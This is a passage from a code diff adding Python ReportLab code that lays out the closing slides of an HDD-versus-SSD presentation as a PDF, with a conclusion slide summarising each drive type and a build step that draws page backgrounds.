+    ("BOTTOMPADDING", (0,0), (-1,-1), 8),
+    ("LEFTPADDING",   (0,0), (-1,-1), 14),
+    ("VALIGN",        (0,0), (-1,-1), "TOP"),
+]))
+story.append(ft_tbl)
+story.append(Spacer(1, 0.2*cm))
+story.append(Paragraph("Verdict: SSDs will dominate performance tiers; HDDs will remain vital for massive-scale cheap storage for at least a decade.",
+                        ms("FTN", fontName="Helvetica-Oblique", fontSize=10, textColor=GRAY, leading=14)))
+slide_backgrounds.append("content")
+end_slide()
+
+# ── SLIDE 12: CONCLUSION ────────────────────────────────────────────
+story.append(Spacer(1, 1.5*cm))
+story.append(Paragraph("Conclusion", ms("CH", fontName="Helvetica-Bold", fontSize=24, textColor=WHITE,
+                                         leading=30, alignment=TA_CENTER)))
+story.append(Spacer(1, 0.4*cm))
+story.append(HRFlowable(width="60%", thickness=2, color=ACCENT2, spaceAfter=16))
+for line in [
+    "🔵  HDD: best for <b>high capacity at low cost</b> — backups, archives, media servers.",
+    "🟢  SSD: best for <b>speed, reliability, and portability</b> — every modern laptop &amp; PC.",
+    "🔁  <b>Hybrid approach</b> gives maximum value: NVMe SSD + HDD in one system.",
+    "📈  SSD prices keep falling — will displace HDD in most segments by 2030.",
+    "🏭  HDDs remain essential in data centres for cold storage economics.",
+]:
+    story.append(Paragraph(line, ms("CL", fontName="Helvetica", fontSize=11, textColor=WHITE,
+                                     leading=19, spaceAfter=6)))
+story.append(Spacer(1, 0.5*cm))
+story.append(Paragraph("Thank You  🙏", ms("TY", fontName="Helvetica-Bold", fontSize=18,
+                                            textColor=ACCENT2, alignment=TA_CENTER)))
+slide_backgrounds.append("section")
+# No PageBreak needed for last slide
+
+# ── BUILD ───────────────────────────────────────────────────────────
+SLIDE_NUM[0] = 0
+bg_iter = iter(slide_backgrounds)
+
+def on_page(canvas, doc):
+    try:
+        bg = next(bg_iter)
+    except StopIteration:
+        bg = "content"
+    draw_slide_bg(canvas, doc, bg)
+
+doc.build(story, onFirstPage=on_page, onLaterPages=on_page)
+print("Presentation saved!")
